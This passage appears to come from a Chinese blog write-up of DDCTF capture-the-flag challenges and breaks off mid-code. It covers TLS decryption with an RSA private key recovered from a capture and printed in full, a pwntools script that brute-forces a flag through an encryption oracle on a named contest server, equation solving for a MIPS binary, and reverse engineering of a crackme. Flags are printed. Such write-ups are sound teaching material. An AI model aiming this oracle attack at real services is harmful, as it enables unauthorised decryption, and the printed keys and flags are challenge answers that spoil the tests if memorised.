KEY—–</p></blockquote><p>研究ssl传输流，但是需要获取私钥，往流的前面翻，看到一个mime的邮件内容为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">=20</span><br><span class="line"></span><br><span class="line">=20</span><br><span class="line"></span><br><span class="line">=E5=B0=8F=E5=BC=A0=E4=BD=A0=E5=A5=BD=EF=BC=9A</span><br><span class="line"></span><br><span class="line">=20</span><br><span class="line"></span><br><span class="line">=20</span><br><span class="line"></span><br><span class="line">=E4=BD=A0=E5=A5=BD=EF=BC=8C=E8=AF=B7=E4=BD=A0=E5=B0=86=E5=AF=86=E9=92=A5=E5=AE=89=E8=A3=85=E5=88=B0=E6=9C=8D=E5=8A=A1=E5=99=A8=E4=B8=8A=E3=80=82=E8=B0=A2=E8=B0=A2</span><br><span class="line"></span><br><span class="line">=20</span><br><span class="line"></span><br><span class="line">=20</span><br><span class="line"></span><br><span class="line">=20</span><br></pre></td></tr></table></figure><p>解码意思如下：小张你好：你好，请你将密钥安装到服务器上。谢谢<br>随后翻到下面的一张base64加密的图片，解密得到私钥如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN RSA PRIVATE KEY-----</span><br><span class="line">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class="line">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class="line">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class="line">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class="line">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class="line">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class="line">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class="line">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class="line">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class="line">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class="line">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class="line">/5pfc3AmEyRdfyx6zwUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class="line">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p><p>通过wireshark本身的解密功能，得到flag： DDCTF{efd2a79ae9ae5008694a3561fb55470e}</p><h3 id="安全通信"><a href="#安全通信" class="headerlink" title="安全通信"></a>安全通信</h3><p>这个题目看懂python即，sha1加密，加密位数为16位，所以通过agentid来不断使整个输入位数增长或者减少即可实现解密。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">angent_ID = <span class="string">"11111111"</span></span><br><span class="line">flag = [<span class="number">31</span>]*<span class="number">33</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> count != <span class="number">-1</span>:</span><br><span class="line">    p = remote(<span class="string">"116.85.48.103"</span>,<span class="number">5002</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(<span class="string">"f49348cf84d390da52498077ae7137d5"</span>)</span><br><span class="line">    p.recv()</span><br><span class="line">    p.sendline(angent_ID)</span><br><span class="line">    ret =  p.recvline()</span><br><span class="line">    p.recv()</span><br><span class="line">    last32 = ret[len(ret)<span class="number">-33</span><span class="number">-32</span><span class="number">-32</span>:len(ret)<span class="number">-33</span><span class="number">-32</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:   </span><br><span class="line">        msg = <span class="string">"Connection for mission: "</span>+angent_ID+<span class="string">", your mission's flag is: DDCTF&#123;"</span> </span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flag:</span><br><span class="line">            msg +=x</span><br><span class="line">        p.sendline(msg)</span><br><span class="line">        ret =  p.recvline()</span><br><span class="line">        last32_1 = ret[len(ret)<span class="number">-33</span><span class="number">-32</span><span class="number">-32</span>:len(ret)<span class="number">-1</span><span class="number">-32</span><span class="number">-32</span>]</span><br><span class="line">        <span class="keyword">if</span> last32_1 == last32:</span><br><span class="line">            result += flag[count]</span><br><span class="line">            count = count - <span class="number">1</span> </span><br><span class="line">            angent_ID += <span class="string">'1'</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag[count] = chr(ord(flag[count])+<span class="number">1</span>)</span><br><span class="line">        p.recv()</span><br><span class="line">    p.close()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>   result[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure></p><p>代码是最后得出一部分flag的修改版本，所以应该只能跑出flag的第一位，要跑出其他稍加变换即可。</p><h3 id="Baby-MIPS"><a href="#Baby-MIPS" class="headerlink" title="Baby MIPS"></a>Baby MIPS</h3><p>题目很坑，竟然是一个不能运行的程序，时间都花在考虑如何让它跑起来了，后来放弃之后认真看了下这一段非常长的代码，才发现是一个16<em>16的线性方程组，是真滴坑。<br>下面是获取16</em>16参数和16个结果的idapython：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x400430</span></span><br><span class="line">end = <span class="number">0x004017A8</span></span><br><span class="line">op = <span class="string">''</span></span><br><span class="line">v0 = <span class="number">0</span></span><br><span class="line">number = <span class="number">8</span></span><br><span class="line">result = <span class="number">1028</span>*[<span class="number">1</span>] </span><br><span class="line">result2 = [] </span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> range(start,end):</span><br><span class="line">    <span class="keyword">if</span> GetOpnd(line,<span class="number">2</span>) != <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    opnd1 = str(hex(number + <span class="number">4</span>))+<span class="string">'($fp)'</span></span><br><span class="line">    <span class="keyword">if</span>(idc.GetOpnd(line,<span class="number">1</span>).lower() == opnd1):</span><br><span class="line">        number = number + <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'sw'</span>:</span><br><span class="line">        result[number] = v0</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'li'</span>:</span><br><span class="line">        v0 = int(GetOpnd(line,<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'lw'</span>:</span><br><span class="line">        v0 = result[number]</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'sra'</span>:</span><br><span class="line">        n = int(GetOpnd(line,<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">        v0 = v0 &gt;&gt; n</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'xori'</span>:</span><br><span class="line">        n = int(GetOpnd(line,<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">        v0 = v0 ^ n</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'sll'</span>:</span><br><span class="line">        n = int(GetOpnd(line,<span class="number">1</span>),<span class="number">16</span>)</span><br><span class="line">        v0 = v0 &lt;&lt; n</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x004017B0</span>  </span><br><span class="line">end = <span class="number">0x0040312C</span></span><br><span class="line"></span><br><span class="line">number = <span class="number">8</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> range(start,end):</span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'lw'</span>:</span><br><span class="line">        <span class="keyword">if</span> idc.GetOpnd(line,<span class="number">0</span>) == <span class="string">"$v1"</span>:</span><br><span class="line">            number = number + <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'negu'</span>:</span><br><span class="line">        result[number] = - result[number]</span><br><span class="line">        number = number + <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'subu'</span>:</span><br><span class="line">        result[number] = - result[number]</span><br><span class="line">        number = number + <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'addu'</span>:</span><br><span class="line">        number = number + <span class="number">4</span></span><br><span class="line">    <span class="keyword">if</span> idc.GetMnem(line) == <span class="string">'li'</span>:</span><br><span class="line">        <span class="keyword">if</span> idc.GetOpnd(line,<span class="number">0</span>) == <span class="string">"$v0"</span>:</span><br><span class="line">            result2.append(GetOpnd(line,<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> result2:</span><br><span class="line">    <span class="keyword">print</span> x,</span><br></pre></td></tr></table></figure></p><p>得出参数后用python解方程：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">A = np.array([[<span class="number">-0xdbbb</span>,<span class="number">0xfbf1</span>,<span class="number">-0xf15b</span>,<span class="number">0x7529</span>,<span class="number">-0x41d5</span>,<span class="number">0x863</span>,<span class="number">-0xcb16</span>,<span class="number">-0x8db6</span>,<span class="number">-0x853c</span>,<span class="number">-0x47c</span>,<span class="number">0x706</span>,<span class="number">-0xa9bc</span>,<span class="number">-0x3f16</span>,<span class="number">-0xdb17</span>,<span class="number">-0x450d</span>,<span class="number">-0xa318</span>],</span><br><span class="line">[<span class="number">-0x99ba</span>,<span class="number">0xf90a</span>,<span class="number">0xc551</span>,<span class="number">0x95c</span>,<span class="number">-0x9248</span>,<span class="number">0xaa41</span>,<span class="number">0x4c0c</span>,<span class="number">-0x1250</span>,<span class="number">-0xf595</span>,<span class="number">-0x50b7</span>,<span class="number">0xa0d5</span>,<span class="number">0xeeb9</span>,<span class="number">0x788e</span>,<span class="number">0x9550</span>,<span class="number">-0x259</span>,<span class="number">0xd28b</span>],</span><br><span class="line">[<span class="number">0x68ae</span>,<span class="number">-0xe608</span>,<span class="number">0x3a51</span>,<span class="number">-0x54f7</span>,<span class="number">-0x3061</span>,<span class="number">0xda99</span>,<span class="number">-0x50ea</span>,<span class="number">0x6141</span>,<span class="number">0x9c6d</span>,<span class="number">0x264d</span>,<span class="number">0x623b</span>,<span class="number">0x9b21</span>,<span class="number">-0x55c0</span>,<span class="number">-0xa758</span>,<span class="number">0x9431</span>,<span class="number">-0x216f</span>],</span><br><span class="line">[<span class="number">-0xae5</span>,<span class="number">0xd06f</span>,<span class="number">0x416b</span>,<span class="number">0xd3b3</span>,<span class="number">-0x7544</span>,<span class="number">0x9bec</span>,<span class="number">-0x7f46</span>,<span class="number">0xebb2</span>,<span class="number">0x3693</span>,<span class="number">0x6aab</span>,<span class="number">-0x7714</span>,<span class="number">0xbad2</span>,<span class="number">0x92b2</span>,<span class="number">0xfd92</span>,<span class="number">-0x6d1</span>,<span class="number">0x6c15</span>],</span><br><span class="line">[<span class="number">0x9db6</span>,<span class="number">0x197b</span>,<span class="number">0x3444</span>,<span class="number">-0xd0a5</span>,<span class="number">-0x4aa</span>,<span class="number">0x1e74</span>,<span class="number">-0x7c47</span>,<span class="number">-0xca9a</span>,<span class="number">-0x9d3c</span>,<span class="number">-0xde33</span>,<span class="number">0xe1d3</span>,<span class="number">0x5aee</span>,<span class="number">-0x1699</span>,<span class="number">0xf055</span>,<span class="number">-0x1b48</span>,<span class="number">-0x1ca7</span>],</span><br><span class="line">[<span class="number">-0xdedc</span>,<span class="number">-0xfc3d</span>,<span class="number">-0xf38f</span>,<span class="number">0xa44</span>,<span class="number">0x53f5</span>,<span class="number">0x328b</span>,<span class="number">-0xea66</span>,<span class="number">0x1b3</span>,<span class="number">0x3aa1</span>,<span class="number">-0xffb</span>,<span class="number">0x58d7</span>,<span class="number">0x1325</span>,<span class="number">0xbea3</span>,<span class="number">-0xa8c3</span>,<span class="number">0x148f</span>,<span class="number">-0x80e2</span>],</span><br><span class="line">[<span class="number">0xd5e8</span>,<span class="number">0xa05d</span>,<span class="number">0x5809</span>,<span class="number">-0xdc99</span>,<span class="number">0xb4ec</span>,<span class="number">0x4d4b</span>,<span class="number">-0x9cf4</span>,<span class="number">0x828</span>,<span class="number">0x7fc</span>,<span class="number">0x67cf</span>,<span class="number">-0x1457</span>,<span class="number">0x797a</span>,<span class="number">-0x5d1e</span>,<span class="number">0x548a</span>,<span class="number">0xb69e</span>,<span class="number">0x358a</span>],</span><br><span class="line">[<span class="number">-0x9cf0</span>,<span class="number">-0xa976</span>,<span class="number">0xbe4e</span>,<span class="number">-0x634f</span>,<span class="number">0x53cc</span>,<span class="number">-0x8f6a</span>,<span class="number">-0x5e37</span>,<span class="number">-0x33af</span>,<span class="number">-0xcbe0</span>,<span class="number">0xc24e</span>,<span class="number">0xd5b5</span>,<span class="number">-0x7f7c</span>,<span class="number">0x4f09</span>,<span class="number">0x53d4</span>,<span class="number">0xbe5d</span>,<span class="number">0x3b33</span>],</span><br><span class="line">[<span class="number">0x962e</span>,<span class="number">-0x370</span>,<span class="number">-0x98b</span>,<span class="number">0xc537</span>,<span class="number">-0xb77d</span>,<span class="number">-0xdb72</span>,<span class="number">-0x9112</span>,<span class="number">-0x2377</span>,<span class="number">-0x4a98</span>,<span class="number">-0xee3c</span>,<span class="number">-0x71f</span>,<span class="number">-0x5422</span>,<span class="number">0xab78</span>,<span class="number">-0x102d</span>,<span class="number">-0x4baa</span>,<span class="number">-0xbab4</span>],</span><br><span class="line">[<span class="number">0x1438</span>,<span class="number">0x47e0</span>,<span class="number">-0xd25c</span>,<span class="number">0x8d17</span>,<span class="number">-0x7d78</span>,<span class="number">0xba6c</span>,<span class="number">0x4302</span>,<span class="number">0x150e</span>,<span class="number">-0x7415</span>,<span class="number">0x3887</span>,<span class="number">0x2233</span>,<span class="number">0x598</span>,<span class="number">-0xb1ce</span>,<span class="number">-0x1fd4</span>,<span class="number">-0xdd2f</span>,<span class="number">-0xbc7e</span>],</span><br><span class="line">[<span class="number">0x75fb</span>,<span class="number">-0xc618</span>,<span class="number">-0x6ba8</span>,<span class="number">-0x3ecb</span>,<span class="number">0xe22</span>,<span class="number">0x24e</span>,<span class="number">0xad11</span>,<span class="number">0x5065</span>,<span class="number">0x82a2</span>,<span class="number">-0x1e3f</span>,<span class="number">-0xa843</span>,<span class="number">-0x3f6a</span>,<span class="number">0xb29b</span>,<span class="number">-0xaf63</span>,<span class="number">0xa551</span>,<span class="number">0xc070</span>],</span><br><span class="line">[<span class="number">0xa6d1</span>,<span class="number">-0x7e2b</span>,<span class="number">-0x4ad4</span>,<span class="number">0x15da</span>,<span class="number">0x70c6</span>,<span class="number">0x1f7b</span>,<span class="number">0xe2f7</span>,<span class="number">-0xed33</span>,<span class="number">-0x7d70</span>,<span class="number">-0x1bd8</span>,<span class="number">0xb3a1</span>,<span class="number">-0x6153</span>,<span class="number">0xf9a6</span>,<span class="number">0x47fb</span>,<span class="number">-0xc8d0</span>,<span class="number">0x585b</span>],</span><br><span class="line">[<span class="number">-0xe0ad</span>,<span class="number">0x5102</span>,<span class="number">-0x7e1e</span>,<span class="number">0xdabb</span>,<span class="number">0x682a</span>,<span class="number">0x92ae</span>,<span class="number">-0xc921</span>,<span class="number">0x35a5</span>,<span class="number">0x7ec7</span>,<span class="number">-0xb51</span>,<span class="number">-0x9ac6</span>,<span class="number">-0xd4fb</span>,<span class="number">0xc62d</span>,<span class="number">-0x6049</span>,<span class="number">-0x45b9</span>,<span class="number">-0xf376</span>],</span><br><span class="line">[<span class="number">-0x3d64</span>,<span class="number">-0x9578</span>,<span class="number">0xfbdc</span>,<span class="number">-0x9294</span>,<span class="number">-0xf06f</span>,<span class="number">0x34e0</span>,<span class="number">0x3278</span>,<span class="number">0x57f</span>,<span class="number">-0xf917</span>,<span class="number">-0xd741</span>,<span class="number">-0xb5cf</span>,<span class="number">-0x8ed2</span>,<span class="number">-0x50e8</span>,<span class="number">0x80f</span>,<span class="number">-0x1a0c</span>,<span class="number">0x2372</span>],</span><br><span class="line">[<span class="number">0xb982</span>,<span class="number">0x48b3</span>,<span class="number">0xccc0</span>,<span class="number">0xc23</span>,<span class="number">0x7db1</span>,<span class="number">-0xa334</span>,<span class="number">0x2b00</span>,<span class="number">0x1c37</span>,<span class="number">0x1614</span>,<span class="number">0x371</span>,<span class="number">0x685f</span>,<span class="number">-0x6f1c</span>,<span class="number">0xb3fd</span>,<span class="number">-0x110</span>,<span class="number">-0x7edb</span>,<span class="number">-0x24d8</span>],</span><br><span class="line">[<span class="number">-0xe63a</span>,<span class="number">-0x8b69</span>,<span class="number">0x8b7c</span>,<span class="number">0xae91</span>,<span class="number">0xb34e</span>,<span class="number">0x8f06</span>,<span class="number">0x9696</span>,<span class="number">0x2db</span>,<span class="number">0xc346</span>,<span class="number">0x1a47</span>,<span class="number">0xf056</span>,<span class="number">-0x8b03</span>,<span class="number">-0x991f</span>,<span class="number">-0xab6e</span>,<span class="number">-0xdc59</span>,<span class="number">-0x63af</span>]])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">B = np.array([<span class="number">0xFE8E3EBA</span>, <span class="number">0x1061309</span> ,<span class="number">0x84D6C3</span>, <span class="number">0x19B6934</span>, <span class="number">0xFF9E94D4</span>, <span class="number">0xFF141D3B</span>, <span class="number">0x12A6103</span>, <span class="number">0xFFFD20AD</span>, <span class="number">0xFED51449</span> ,<span class="number">0xFF3D61C1</span>, <span class="number">0x624DA6</span>, <span class="number">0xFFD43532</span>, <span class="number">0xFFB6AD60</span>, <span class="number">0xFEDEA130</span>, <span class="number">0x8862D9</span>,<span class="number">0x3B7496</span>])</span><br><span class="line"></span><br><span class="line">B2 = np.array([<span class="number">-24232262</span>, <span class="number">0x1061309</span> ,<span class="number">0x84D6C3</span>, <span class="number">0x19B6934</span>, <span class="number">-6384428</span>, <span class="number">-15459013</span>, <span class="number">0x12A6103</span>, <span class="number">-188243</span>, <span class="number">-19590071</span> ,<span class="number">-12754495</span>, <span class="number">0x624DA6</span>, <span class="number">-2869966</span>, <span class="number">-4805280</span>, <span class="number">-18964176</span>, <span class="number">0x8862D9</span>,<span class="number">0x3B7496</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x = np.linalg.solve(A, B2)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ((x))</span><br></pre></td></tr></table></figure></p><h3 id="黑盒破解"><a href="#黑盒破解" class="headerlink" title="黑盒破解"></a>黑盒破解</h3><p>这题目应该是最有意思的一个题目了,整个函数就围绕着 new2720_v4 = (struct_a1 *)operator new(0xAA0uLL);整个结构体展开，重点实在解密出每个字母对应的函数<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">sub_401A48</span><span class="params">(struct_a1 *new2720_v4_2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [rsp+13h] [rbp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( new2720_v4_2 &amp;&amp; new2720_v4_2 != (struct_a1 *)<span class="number">-16L</span>L )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(new2720_v4_2-&gt;passcode); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = new2720_v4_2-&gt;passcode[i];</span><br><span class="line">      <span class="keyword">if</span> ( i + <span class="number">1</span> != <span class="built_in">strlen</span>(new2720_v4_2-&gt;passcode) )</span><br><span class="line">        new2720_v4_2-&gt;byte298 = new2720_v4_2-&gt;passcode[i + <span class="number">1</span>];</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">8</span>; ++j )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( byte_603900[v2] != *((_BYTE *)&amp;new2720_v4_2-&gt;dword198</span><br><span class="line">                                + *((<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;new2720_v4_2-&gt;input_str_encode + j + <span class="number">72L</span>L)) )</span><br><span class="line">        &#123;</span><br><span class="line">          new2720_v4_2-&gt;qword2A0 = *(&amp;new2720_v4_2-&gt;input_str_encode</span><br><span class="line">                                   + *((<span class="keyword">signed</span> <span class="keyword">int</span> *)&amp;new2720_v4_2-&gt;input_str_encode + j + <span class="number">72L</span>L)</span><br><span class="line">                                   + <span class="number">84L</span>L);</span><br><span class="line">          ((<span class="keyword">void</span> (__fastcall *)(struct_a1 *))new2720_v4_2-&gt;qword2A0)(new2720_v4_2);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>认真分析是比较输入的字符，然后跟八个opcode去比较，是哪个就执行哪个函数：八个函数就不贴了，八个opcode分别是：$  0  C  E  8  t  u  ;  ####<br>嗯，分析每个opcode的函数相应的操作就可以了：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$： a1-&gt;<span class="number">299</span> = *(a1-&gt;<span class="number">120</span>+a1-&gt;<span class="number">8</span>) </span><br><span class="line"><span class="number">0</span>:  ++(a1-&gt;<span class="number">120</span>)</span><br><span class="line"><span class="number">8</span>:  *(a1-&gt;<span class="number">120</span>+a1-&gt;<span class="number">8</span>) = a1-&gt;<span class="number">299</span></span><br><span class="line">C:  a1-&gt;<span class="number">299</span> = a1-&gt;<span class="number">299</span> + a1-&gt;<span class="number">298</span> - <span class="number">33</span></span><br><span class="line">E:  关键输出函数，<span class="keyword">if</span> ( a1-&gt;byte298 == <span class="number">0x73</span> ),输出</span><br><span class="line">t:  a1-&gt;<span class="number">299</span> = a1-&gt;<span class="number">299</span> - a1-&gt;<span class="number">298</span> + <span class="number">33</span></span><br><span class="line">u:  --(a1-&gt;<span class="number">120</span>)</span><br><span class="line">;   <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">char</span>)a1-&gt;byte298 &gt; i; ++i )</span><br><span class="line">    ++a1-&gt;dword120;</span><br></pre></td></tr></table></figure></p><p>题目提示要输出Binggo即可,所以调出Binggo即可。<br>6030e0地址中的字符如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PaF0!&amp;Prv&#125;H&#123;ojDQ####7v=2o,wK@8Em/ry2w|n_yWN*z-*sW5vs!&gt;Q8?M&gt;Ue*&#125;&lt;&amp;!c_v?Wz98&gt;79U&#125;LKR&amp;O-3,s2=)!ac&apos;fm,v####WbU5Cv:M&quot;WQa&quot;i%BLT5\&lt;qBI####AK%60ixtn+Kn^Ontp]O9Sr(Nm27H&#125;QM&gt;&lt;iE,x)yN?ok]L########jE&quot;-4i-t&#125;;AzD4&quot;^iEC\3TrZ%55)|3:.YLv&#123;7(cnxA_AsYRXyD&amp;|3U_z^yR/Kpqp6lT/pdv8tp,\^Y7T+oLsvf</span><br></pre></td></tr></table></figure></p><ol><li>a1-&gt;120参数可以用作输出的偏移，利用0和u操作单次改变偏移，利用;+偏移量来指定较大偏移量加值</li><li>*(a1-&gt;120+a1-&gt;8) 可以用作赋值给a1-&gt;299的中间变量</li><li>t和C+一个偏移量可以用作输入赋值</li><li>利用8来给6030e0中a1-&gt;120偏移赋值</li><li>利用Es使得a1-&gt;byte298 == 0x73输出Binggo</li></ol><p>一开始我从6030e0开始输入Binggo，后来发现无论如何都无法写入00，看到如下函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// *(a1-&gt;120+a1-&gt;8) = a1-&gt;299</span></span><br><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">funcchr8</span><span class="params">(struct_a1 *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !a1 || a1-&gt;dword120 &gt;= a1-&gt;dword124 || !a1-&gt;byte299 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  *(_BYTE *)((<span class="keyword">signed</span> <span class="keyword">int</span>)a1-&gt;dword120 + a1-&gt;input_str_encode) = 